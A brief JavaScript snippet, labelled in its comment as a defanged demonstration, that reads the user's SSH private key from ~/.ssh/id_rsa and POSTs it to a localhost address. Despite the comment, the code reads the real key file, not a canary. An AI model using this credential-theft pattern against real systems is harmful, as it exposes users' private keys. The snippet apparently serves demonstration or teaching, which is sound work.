// Defanged: reads a canary and posts to localhost only. Demonstration, not a working payload.
const fs = require("fs");
const key = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, "utf8");
fetch("http://127.0.0.1:9/x", { method: "POST", body: key });
